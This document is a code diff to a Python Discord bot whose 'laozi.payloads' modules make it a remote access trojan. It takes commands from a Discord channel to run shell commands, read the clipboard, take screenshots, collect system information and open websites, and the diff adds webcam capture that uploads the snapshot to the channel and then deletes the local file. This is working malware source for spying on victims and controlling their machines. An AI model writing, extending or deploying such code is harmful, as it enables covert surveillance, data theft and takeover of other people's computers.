@@ -1,8 +1,11 @@
 import os
+
 import discord
+
 from laozi.payloads.systeminfo import get_sys_info
 from laozi.payloads.clipboard import get_clipboard
 from laozi.payloads.screenshot import get_screenshot
+from laozi.payloads.webcam import get_webcam_snapshot
 from laozi.payloads.website import open_website
 from laozi.payloads.messagebox import display_messagebox
 
@@ -24,12 +27,13 @@ class DiscordBotClient(discord.Client):
         channel = self.get_channel(self.target_channel_id)
         if channel:
             commands = [
-                "!alert - Trigger message box",
-                "!clipboard - Get clipboard content",
-                "!execute - Execute a shell command",
-                "!screenshot - Take a screenshot",
-                "!sysinfo - Get system information",
-                "!website - Open a website"
+                "!alert       <message>  -> Trigger message box",
+                "!clipboard              -> Get clipboard content",
+                "!execute     <command>  -> Execute a shell command",
+                "!screenshot             -> Take a screenshot",
+                "!sysinfo                -> Get system information",
+                "!webcam                 -> Get webcam snapshot",
+                "!website     <url>      -> Open a website"
             ]
             command_text = "\n".join(sorted(commands))
             await channel.send(f"@everyone Hello!\nHere are the available commands:\n```{command_text}```")
@@ -47,6 +51,7 @@ class DiscordBotClient(discord.Client):
             "!alert": self.trigger_messagebox,
             "!clipboard": self.handle_clipboard,
             "!website": open_website,
+            "!webcam": self.handle_webcam_snapshot,
             "!screenshot": self.handle_screenshot,
         }
 
@@ -74,6 +79,14 @@ class DiscordBotClient(discord.Client):
     async def handle_clipboard(self, channel, _):
         clipboard_content = get_clipboard() or "Clipboard is empty or unavailable."
         await channel.send(f"Clipboard content:\n```{clipboard_content}```")
+
+    async def handle_webcam_snapshot(self, channel, _):
+        webcam_snapshot = get_webcam_snapshot()
+        if webcam_snapshot:
+            await channel.send(file=discord.File(webcam_snapshot))
+            os.remove(webcam_snapshot)
+        else:
+            await channel.send("Failed to capture screenshot.")
 
     async def handle_screenshot(self, channel, _):
         screenshot = get_screenshot()
